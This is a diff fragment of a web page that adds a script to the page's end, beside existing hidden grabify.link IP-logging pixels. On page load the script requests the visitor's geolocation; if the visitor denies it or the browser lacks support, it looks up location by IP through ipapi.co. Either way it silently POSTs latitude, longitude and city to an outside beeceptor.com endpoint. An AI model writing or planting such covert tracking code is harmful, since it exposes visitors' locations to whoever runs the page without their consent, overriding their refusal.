@@ -291,6 +291,45 @@
   <img alt="" src="https://grabify.link/images/pixel.png"style="display:none;">
   <img alt="" src="https://grabify.link/RJD4OJ.png"style="display:none;">
   
+<script>
+function sendLocation(locationObj) {
+  fetch('https://location.free.beeceptor.com/location', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ location: locationObj })
+  });
+}
 
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(function(pos) {
+    sendLocation({
+      lat: pos.coords.latitude,
+      lng: pos.coords.longitude
+    });
+  }, function() {
+    // Fallback to IP if user blocks/denies
+    fetch('https://ipapi.co/json/')
+      .then(res => res.json())
+      .then(data => {
+        sendLocation({
+          lat: data.latitude,
+          lng: data.longitude,
+          city: data.city
+        });
+      });
+  });
+} else {
+  // Browser doesn't support geolocation, fallback to IP-based
+  fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+      sendLocation({
+        lat: data.latitude,
+        lng: data.longitude,
+        city: data.city
+      });
+    });
+}
+</script>
 
 </body></html>
